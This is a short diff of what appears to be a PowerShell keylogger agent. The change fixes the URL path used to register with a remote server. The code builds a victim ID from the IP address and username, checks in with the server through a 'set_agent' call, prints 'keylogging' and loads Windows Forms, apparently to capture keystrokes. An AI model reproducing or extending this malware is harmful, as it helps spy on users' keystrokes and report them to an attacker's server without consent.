@@ -4,7 +4,7 @@ $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
 write-host $id
 
-if((New-Object Net.WebClient).DownloadString($server+'set_agent/'+$id) -eq 'true') {
+if((New-Object Net.WebClient).DownloadString($server+'/set_agent/'+$id) -eq 'true') {
 write-host 'keylogging'
 [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
 
